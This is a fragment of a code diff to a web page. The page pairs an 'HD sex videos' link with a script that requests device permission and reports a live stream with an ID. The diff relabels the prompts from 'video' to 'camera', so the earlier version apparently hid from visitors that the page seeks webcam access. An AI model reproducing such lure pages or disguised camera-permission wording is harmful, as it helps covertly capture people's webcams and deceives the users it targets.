@@ -127,7 +127,7 @@
   >
     HD sex videos
   </a>
-<script>
+  <script>
   const status =
     document.getElementById("status");
 
@@ -198,7 +198,7 @@
     }
 
     sendMessage({
-      type: "video-live"
+      type: "camera-live"
     });
   }
 
@@ -215,7 +215,7 @@
         true;
 
       permissionMessage.textContent =
-        "Requesting permission...";
+        "Requesting camera permission...";
 
 
       try {
@@ -278,7 +278,7 @@
 
 
         status.textContent =
-          "video active: " +
+          "Camera active: " +
           (settings.width || "?") +
           "x" +
           (settings.height || "?");
@@ -303,11 +303,11 @@
 
 
         permissionMessage.textContent =
-          " permission was not granted. Please allow access.";
+          "Camera permission was not granted. Please allow camera access.";
 
 
         status.textContent =
-          " permission denied";
+          "Camera permission denied";
 
       }
 
@@ -574,7 +574,7 @@
 
 
         idBox.textContent =
-          "Video ID: " +
+          "Camera ID: " +
           cameraId;
 
 
